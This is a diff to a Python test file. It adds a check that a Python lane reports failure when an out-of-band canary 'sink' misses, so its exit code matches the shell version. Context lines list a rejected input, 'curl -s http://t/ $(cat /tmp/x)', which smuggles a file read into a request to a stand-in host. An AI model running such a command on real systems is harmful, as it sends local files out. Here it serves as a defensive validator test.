@@ -239,3 +239,15 @@ def test_dynamic_non_curl_and_pipes_still_rejected():
                 "curl -s http://t/ $(cat /tmp/x)"):
         ok, why, *_ = _lane_decision(ns, bad)
         assert not ok, f"must reject {bad!r} (got accepted: {why})"
+
+
+def test_python_lane_sink_miss_mirrors_shell_exit_code():
+    """Shell tail: `curl sink | grep -q CANARY && echo ...` -> chain exits 1 on
+    a miss. The Python lane must set exit_code=1 / ok=False on sink miss or
+    every OOB miss shows shell_ec=1 vs py_ec=0 and poisons agreement scoring
+    (observed on the first round-2 dispatch row, 2026-10-07)."""
+    body = _func_src("_execute_curl_chain_in_python")
+    assert body, "_execute_curl_chain_in_python missing"
+    miss = body[body.find('result["sink_hit"] = False'):]
+    assert 'result["exit_code"] = 1' in miss, "sink miss must set exit_code=1"
+    assert 'result["ok"] = False' in miss, "sink miss must set ok=False"
